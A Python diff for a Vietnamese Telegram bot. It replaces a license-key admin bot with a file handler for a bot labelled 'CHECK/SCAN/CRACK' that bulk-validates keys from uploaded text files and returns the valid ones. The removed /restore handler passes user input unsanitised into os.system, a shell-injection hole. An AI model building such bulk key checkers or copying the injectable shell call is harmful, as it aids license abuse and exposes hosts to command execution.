-        days = int(parts[4]) if len(parts) > 4 else 30
-        filename = parts[5] if len(parts) > 5 else f"keys_{int(time.time())}.txt"
-        keys = [gen_key(prefix, ktype, days) for _ in range(num)]
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write("\n".join(keys))
-        log(f"ADMIN BULK GEN {num} KEY -> {filename}")
-        with open(filename, 'rb') as f:
-            bot.send_document(msg.chat.id, f, caption=f"📁 {num} keys")
-        os.remove(filename)
-    except Exception as e:
-        logger.error(f"genkeybulk error: {e}")
-        bot.reply_to(msg, f"❌ Lỗi: {e}")
-
-@bot.message_handler(commands=['approve'])
-def cmd_approve(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /approve <UID> [ghi chú]")
-        return
-    note = " ".join(parts[2:]) if len(parts) > 2 else ""
-    if "approved" not in db:
-        db["approved"] = {}
-    db["approved"][parts[1]] = {
-        "approved_by": str(msg.from_user.id),
-        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "note": note
-    }
-    log(f"ADMIN APPROVE: {parts[1]}")
-    save_db()
-    bot.reply_to(msg, f"✅ Đã duyệt: `{parts[1]}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['unapprove'])
-def cmd_unapprove(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /unapprove <UID>")
-        return
-    if "approved" not in db:
-        db["approved"] = {}
-    db["approved"].pop(parts[1], None)
-    log(f"ADMIN UNAPPROVE: {parts[1]}")
-    save_db()
-    bot.reply_to(msg, f"🚫 Đã hủy duyệt: `{parts[1]}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['kick'])
-def cmd_kick(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /kick <UID> [lý do]")
-        return
-    reason = " ".join(parts[2:]) if len(parts) > 2 else "No reason"
-    if "kicked" not in db:
-        db["kicked"] = {}
-    if "stats" not in db:
-        db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-    db["kicked"][parts[1]] = {
-        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
-        "by": str(msg.from_user.id),
-        "reason": reason
-    }
-    if "approved" in db:
-        db["approved"].pop(parts[1], None)
-    db["stats"]["total_kicked"] = db["stats"].get("total_kicked", 0) + 1
-    log(f"ADMIN KICK: {parts[1]} - {reason}")
-    save_db()
-    bot.reply_to(msg, f"❌ Đã kick: `{parts[1]}`\n📝 Lý do: {reason}", parse_mode="Markdown")
-
-@bot.message_handler(commands=['ban'])
-def cmd_ban(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /ban <UID/IP/Device> [lý do]")
-        return
-    target = parts[1]
-    reason = " ".join(parts[2:]) if len(parts) > 2 else "Banned by admin"
-    if '.' in target and re.match(r'^[\d.:]+$', target):
-        if "banned_ips" not in bans:
-            bans["banned_ips"] = []
-        bans["banned_ips"].append({"ip": target, "reason": reason, "time": time.strftime("%Y-%m-%d %H:%M:%S")})
-    else:
-        if "banned_uids" not in bans:
-            bans["banned_uids"] = []
-        bans["banned_uids"].append({"uid": target, "reason": reason, "time": time.strftime("%Y-%m-%d %H:%M:%S")})
-    save_bans()
-    log(f"ADMIN BAN: {target}")
-    bot.reply_to(msg, f"🔨 Đã ban: `{target}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['unban'])
-def cmd_unban(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /unban <UID/IP>")
-        return
-    target = parts[1]
-    if "banned_uids" not in bans:
-        bans["banned_uids"] = []
-    if "banned_ips" not in bans:
-        bans["banned_ips"] = []
-    bans["banned_uids"] = [x for x in bans["banned_uids"] if (x.get("uid") if isinstance(x, dict) else x) != target]
-    bans["banned_ips"] = [x for x in bans["banned_ips"] if (x.get("ip") if isinstance(x, dict) else x) != target]
-    save_bans()
-    log(f"ADMIN UNBAN: {target}")
-    bot.reply_to(msg, f"🔓 Đã gỡ ban: `{target}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['deletekey'])
-def cmd_deletekey(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /deletekey <key>")
-        return
-    key = parts[1]
-    if "keys" not in db or key not in db["keys"]:
-        bot.reply_to(msg, "❌ Key không tồn tại.")
-        return
-    
-    # Xóa key
-    deleted_key = db["keys"].pop(key)
-    
-    # Xóa khỏi approved
-    if "approved" in db:
-        uids_to_remove = [uid for uid, info in db["approved"].items() if info.get("key") == key]
-        for uid in uids_to_remove:
-            db["approved"].pop(uid, None)
-    
-    log(f"ADMIN DELETE KEY: {key}")
-    save_db()
-    bot.reply_to(msg, f"🗑️ Đã xóa key: `{key}`\nLoại: {deleted_key.get('type')}\nĐã dùng: {deleted_key.get('used', False)}", parse_mode="Markdown")
-
-@bot.message_handler(commands=['deletekeybulk'])
-def cmd_deletekeybulk(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 3:
-        bot.reply_to(msg, "📌 Cú pháp: /deletekeybulk <prefix> <type>")
-        return
-    prefix = parts[1]
-    ktype = parts[2]
-    
-    if "keys" not in db:
-        bot.reply_to(msg, "❌ Không có key nào.")
-        return
-    
-    keys_to_delete = []
-    for k, v in list(db["keys"].items()):
-        if k.startswith(prefix + "-") and v.get("type") == ktype:
-            keys_to_delete.append(k)
-    
-    deleted_count = 0
-    for key in keys_to_delete:
-        db["keys"].pop(key)
-        deleted_count += 1
-    
-    # Clean up approved
-    if "approved" in db:
-        uids_to_remove = [uid for uid, info in db["approved"].items() if info.get("key") in keys_to_delete]
-        for uid in uids_to_remove:
-            db["approved"].pop(uid, None)
-    
-    log(f"ADMIN DELETE BULK: {deleted_count} keys | Prefix: {prefix} | Type: {ktype}")
-    save_db()
-    bot.reply_to(msg, f"🗑️ Đã xóa {deleted_count} key với prefix `{prefix}` và loại `{ktype}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['list'])
-def cmd_list(msg):
-    if "approved" not in db:
-        db["approved"] = {}
-    if "keys" not in db:
-        db["keys"] = {}
-    if "kicked" not in db:
-        db["kicked"] = {}
-    if "stats" not in db:
-        db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-    
-    approved = list(db["approved"].keys())[-20:]
-    keys = list(db["keys"].keys())[-20:]
-    kicked = list(db["kicked"].keys())[-10:]
-    
-    resp = f"📊 Stats: {db['stats'].get('total_keys', 0)} keys | {db['stats'].get('total_approved', 0)} approved | {db['stats'].get('total_kicked', 0)} kicked\n\n"
-    resp += "✅ Approved:\n" + ("\n".join([f"- `{u}`" for u in approved]) or "None")
-    resp += "\n\n🔑 Keys (gần đây):\n" + ("\n".join([f"- `{k[:40]}...`" for k in keys]) or "None")
-    resp += "\n\n❌ Kicked:\n" + ("\n".join([f"- `{u}`" for u in kicked]) or "None")
-    bot.reply_to(msg, resp, parse_mode="Markdown")
-
-@bot.message_handler(commands=['listall'])
-def cmd_listall(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    if "keys" not in db:
-        db["keys"] = {}
-    keys = "\n".join([f"{k}: used={v.get('used', False)}, exp={v.get('expires','N/A')}" for k, v in db["keys"].items()])
-    filename = f"all_keys_{int(time.time())}.txt"
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(keys)
-    with open(filename, 'rb') as f:
-        bot.send_document(msg.chat.id, f)
-    os.remove(filename)
-
-@bot.message_handler(commands=['info'])
-def cmd_info(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /info <UID/Key>")
-        return
-    target = parts[1]
-    if "approved" not in db:
-        db["approved"] = {}
-    if "keys" not in db:
-        db["keys"] = {}
-    
-    if target in db["approved"]:
-        info = db["approved"][target]
-        bot.reply_to(
-            msg,
-            f"👤 UID: `{target}`\n⏰ Duyệt: {info.get('time')}\n👤 Bởi: {info.get('approved_by')}\n📝 Ghi chú: {info.get('note','N/A')}",
-            parse_mode="Markdown"
-        )
-    elif target in db["keys"]:
-        k = db["keys"][target]
-        bot.reply_to(
-            msg,
-            f"🔑 Key: `{target[:40]}...`\n📌 Loại: {k.get('type','N/A')}\n✅ Đã dùng: {k.get('used', False)}\n📅 Hết hạn: {k.get('expires','N/A')}\n🔢 Kích hoạt: {k.get('activations',0)}/{k.get('max_activations',1)}",
-            parse_mode="Markdown"
-        )
-    else:
-        bot.reply_to(msg, "❌ Không tìm thấy.")
-
-@bot.message_handler(commands=['stats'])
-def cmd_stats(msg):
-    if "keys" not in db:
-        db["keys"] = {}
-    total = len(db["keys"])
-    used = sum(1 for v in db["keys"].values() if v.get("used", False))
-    active = 0
-    expired = 0
-    for v in db["keys"].values():
-        if v.get("used", False):
-            try:
-                exp = datetime.strptime(v["expires"], "%Y-%m-%d %H:%M:%S")
-                if datetime.now() > exp:
-                    expired += 1
-                else:
-                    active += 1
-            except:
-                active += 1
-    if "approved" not in db:
-        db["approved"] = {}
-    if "kicked" not in db:
-        db["kicked"] = {}
-    bot.reply_to(
-        msg,
-        f"📊 Thống kê:\n"
-        f"🔑 Tổng: {total}\n"
-        f"✅ Đã dùng: {used}\n"
-        f"🟢 Còn hạn: {active}\n"
-        f"🔴 Hết hạn: {expired}\n"
-        f"👤 Approved: {len(db['approved'])}\n"
-        f"❌ Kicked: {len(db['kicked'])}"
-    )
-
-@bot.message_handler(commands=['logs'])
-def cmd_logs(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    n = int(parts[1]) if len(parts) > 1 else 20
-    if "logs" not in db:
-        db["logs"] = []
-    logs = db["logs"][-n:]
-    text = "\n".join(logs) or "No logs"
-    if len(text) > 4000:
-        filename = f"logs_{int(time.time())}.txt"
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(text)
-        with open(filename, 'rb') as f:
-            bot.send_document(msg.chat.id, f)
-        os.remove(filename)
-    else:
-        bot.reply_to(msg, f"📜 Logs ({n}):\n```\n{text}\n```", parse_mode="Markdown")
-
-@bot.message_handler(commands=['clearlogs'])
-def cmd_clearlogs(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    db["logs"] = []
-    save_db()
-    bot.reply_to(msg, "🗑️ Đã xóa logs.")
-
-@bot.message_handler(commands=['config'])
-def cmd_config_cmd(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 3:
-        bot.reply_to(
-            msg,
-            f"⚙️ Config hiện tại:\n```\n{json.dumps(config, indent=2, ensure_ascii=False)}\n```\n"
-            f"📌 /config <key> <value>",
-            parse_mode="Markdown"
-        )
-        return
-    key, val = parts[1], parts[2]
-    if key in ["auto_approve", "notify_admin", "maintenance"]:
-        config[key] = val.lower() in ["true", "1", "yes", "on"]
-    elif key in ["key_expiry_days", "max_devices_per_key"]:
-        config[key] = int(val)
-    else:
-        config[key] = val
-    save_config()
-    log(f"CONFIG UPDATE: {key}={val}")
-    bot.reply_to(msg, f"✅ Cập nhật: `{key} = {val}`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['broadcast'])
-def cmd_broadcast(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    text = msg.text[len("/broadcast "):]
-    if not text:
-        bot.reply_to(msg, "📌 Cú pháp: /broadcast <nội dung>")
-        return
-    count = 0
-    if "approved" not in db:
-        db["approved"] = {}
-    for uid in set(list(db["approved"].keys()) + [str(x) for x in ADMIN_IDS]):
-        try:
-            bot.send_message(int(uid), f"📢 Thông báo:\n{text}")
-            count += 1
-        except Exception as e:
-            logger.error(f"Broadcast to {uid} failed: {e}")
-    bot.reply_to(msg, f"✅ Đã gửi tới {count} người.")
-
-@bot.message_handler(commands=['backup'])
-def cmd_backup(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    ts = int(time.time())
-    for f in [DB_FILE, BAN_FILE, CONFIG_FILE]:
-        if os.path.exists(f):
-            os.system(f"cp {f} {f}.{ts}.bak")
-    bot.reply_to(msg, f"💾 Backup hoàn tất: `*.{ts}.bak`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['restore'])
-def cmd_restore(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    parts = msg.text.split()
-    if len(parts) < 2:
-        bot.reply_to(msg, "📌 Cú pháp: /restore <timestamp>")
-        return
-    ts = parts[1]
-    for f in [DB_FILE, BAN_FILE, CONFIG_FILE]:
-        bak = f"{f}.{ts}.bak"
-        if os.path.exists(bak):
-            os.system(f"cp {bak} {f}")
-    global db, bans, config
-    db = load_json(DB_FILE, db)
-    bans = load_json(BAN_FILE, bans)
-    config = load_json(CONFIG_FILE, config)
-    bot.reply_to(msg, "🔄 Restore hoàn tất.")
-
-@bot.message_handler(commands=['maintenance'])
-def cmd_maintenance(msg):
-    if not is_admin(msg.from_user.id):
-        bot.reply_to(msg, "❌ Bạn không phải admin!")
-        return
-    config["maintenance"] = not config.get("maintenance", False)
-    save_config()
-    status = "BẬT" if config["maintenance"] else "TẮT"
-    log(f"MAINTENANCE {status}")
-    bot.reply_to(msg, f"🔧 Maintenance: {status}")
-
-@bot.message_handler(func=lambda m: True)
-def handle_all(msg):
-    try:
-        uid = str(msg.from_user.id)
-        text = msg.text.strip() if msg.text else ""
+# =====================================================================
+# XỬ LÝ FILE
+# =====================================================================
+@bot.on(events.NewMessage(incoming=True))
+async def file_handler(event):
+    msg=event.message
+    if msg.text and msg.text.startswith('/'): return
+    if msg.media and isinstance(msg.media,MessageMediaDocument):
+        doc=msg.media.document
+        fname="unknown.txt"; fsize=doc.size
+        for attr in doc.attributes:
+            if isinstance(attr,DocumentAttributeFilename): fname=attr.file_name; break
+        if not fname.lower().endswith('.txt'): return
         
-        if is_banned(uid):
-            bot.reply_to(msg, "⛔ Bạn đã bị cấm sử dụng bot.")
-            return
+        uid=event.sender_id; cid=event.chat_id
+        active_users_set.add(uid); stats['active_users']=len(active_users_set)
+        stats['total_files_processed']+=1
         
-        if config.get("maintenance", False) and not is_admin(msg.from_user.id):
-            bot.reply_to(msg, "🔧 Bot đang bảo trì. Vui lòng thử lại sau.")
-            return
+        sm=await event.reply(f"📥 Đã nhận `{fname}` ({fsize/1024:.1f}KB)\n⏳ Đang xử lý...")
+        sp=os.path.join("./downloads/",f"{uid}_{fname}")
+        try: await msg.download_media(file=sp)
+        except Exception as e: await sm.edit(f"❌ Lỗi: {e}"); return
         
-        if text.startswith('/'):
-            return
+        keys=extract_keys_from_file(sp)
+        if not keys: await sm.edit("⚠️ Không tìm thấy key!"); return
         
-        # Dylib auto-approve
-        if "#KichHoat" in text or "#Start" in text or "#YeuCau" in text:
-            device_uid = None
-            for part in text.split():
-                if part.startswith("UID:") or part.startswith("UDID:"):
-                    device_uid = part.split(":", 1)[1]
-            if device_uid:
-                if not config.get("auto_approve", True):
-                    bot.reply_to(msg, "⏳ Chờ admin duyệt...")
-                    if config.get("notify_admin", True):
-                        for admin in ADMIN_IDS:
-                            try:
-                                bot.send_message(admin, f"📋 Yêu cầu duyệt:\nUID: `{device_uid}`\nUser: {uid}", parse_mode="Markdown")
-                            except:
-                                pass
-                    return
-                if "approved" not in db:
-                    db["approved"] = {}
-                db["approved"][device_uid] = {
-                    "approved_by": "auto",
-                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
-                    "telegram_uid": uid
-                }
-                log(f"AUTO APPROVE: {device_uid}")
-                save_db()
-                bot.reply_to(msg, f"✅ Đã duyệt UID: `{device_uid}`", parse_mode="Markdown")
-                return
+        await sm.edit(f"🔍 Đang check {len(keys)} keys...")
+        valid=run_key_check(keys,uid)
         
-        # Key activation
-        if '-' in text and len(text) > 10:
-            if "kicked" not in db:
-                db["kicked"] = {}
-            if text in db["kicked"]:
-                bot.reply_to(msg, "❌ Key đã bị thu hồi.")
-                return
-            
-            if "keys" not in db:
-                db["keys"] = {}
-            if text not in db["keys"]:
-                bot.reply_to(msg, "❌ Key không hợp lệ hoặc không tồn tại.")
-                return
-            
-            key = db["keys"][text]
-            
-            if key.get("used", False):
-                if key.get("udid") and key["udid"] != uid:
-                    bot.reply_to(msg, "❌ Key đã được kích hoạt trên thiết bị khác.")
-                    return
-                bot.reply_to(msg, "ℹ️ Key đã kích hoạt trước đó.")
-                return
-            
-            if key.get("activations", 0) >= key.get("max_activations", 1):
-                bot.reply_to(msg, "❌ Key đã đạt giới hạn thiết bị.")
-                return
-            
-            try:
-                exp = datetime.strptime(key["expires"], "%Y-%m-%d %H:%M:%S")
-                if datetime.now() > exp:
-                    bot.reply_to(msg, "❌ Key đã hết hạn.")
-                    return
-            except:
-                pass
-            
-            key["used"] = True
-            key["udid"] = uid
-            key["device"] = "Telegram"
-            key["ip"] = msg.from_user.username or "unknown"
-            key["activations"] = key.get("activations", 0) + 1
-            key["activated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
-            if "approved" not in db:
-                db["approved"] = {}
-            if "stats" not in db:
-                db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-            db["approved"][uid] = {
-                "approved_by": "auto",
-                "time": time.strftime("%Y-%m-%d %H:%M:%S"),
-                "key": text
-            }
-            db["stats"]["total_approved"] = db["stats"].get("total_approved", 0) + 1
-            log(f"KEY ACTIVE: {text} by {uid}")
-            save_db()
-            
-            bot.reply_to(
-                msg,
-                f"✅ Key kích hoạt thành công!\n"
-                f"📅 Hết hạn: `{key['expires']}`\n"
-                f"🔢 Lượt kích hoạt: {key['activations']}/{key['max_activations']}",
-                parse_mode="Markdown"
-            )
-            return
-        
-        bot.reply_to(msg, "❓ Không hiểu lệnh. Dùng /help để xem hướng dẫn.")
-    
-    except Exception as e:
-        logger.error(f"Handle error: {e}")
-        bot.reply_to(msg, "⚠️ Đã xảy ra lỗi. Vui lòng thử lại.")
+        if valid:
+            zp,_=create_pack(valid,fname)
+            await sm.edit(f"✅ **{len(valid)}/{len(keys)} keys hợp lệ**")
+            await bot.send_file(cid,zp,caption=f"📦 {fname} | ✅ {len(valid)} valid keys")
+        else:
+            await sm.edit(f"❌ 0/{len(keys)} keys hợp lệ")
+        try: os.remove(sp)
+        except: pass
 
-# ========== RUN ==========
-if __name__ == "__main__":
-    print("🤖 Bot UnbndSDK Online - Admin: 5736655322")
-    log("BOT ONLINE")
+# =====================================================================
+# MAIN
+# =====================================================================
+async def main():
+    print("""╔══════════════════════════════════════╗
+║   BOT CHECK/SCAN/CRACK 24/7        ║
+║   Token: 6320148381:AAFx...        ║
+╚══════════════════════════════════════╝""")
     
-    import threading
-    def run_bot():
-        while True:
-            try:
-                bot.infinity_polling(timeout=60, long_polling_timeout=30)
-            except Exception as e:
-                logger.error(f"Polling error: {e}")
-                time.sleep(5)
+    # Start web server
+    threading.Thread(target=run_web,daemon=True).start()
+    threading.Thread(target=auto_ping,daemon=True).start()
     
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, threaded=True)
+    await bot.start(bot_token=BOT_TOKEN)
+    me=await bot.get_me()
+    stats['bot_username']=f"@{me.username}"
+    print(f"[✓] Bot online: @{me.username}")
+    print(f"[✓] Web: http://0.0.0.0:{WEB_PORT}")
+    print(f"[✓] Sẵn sàng 24/7!\n")
+    await bot.run_until_disconnected()
+
+if __name__=="__main__":
+    import warnings; warnings.filterwarnings("ignore")
+    try: asyncio.run(main())
+    except KeyboardInterrupt: print("\n[!] Dừng bot.")
+    except Exception as e: print(f"\n[!] Lỗi: {e}")
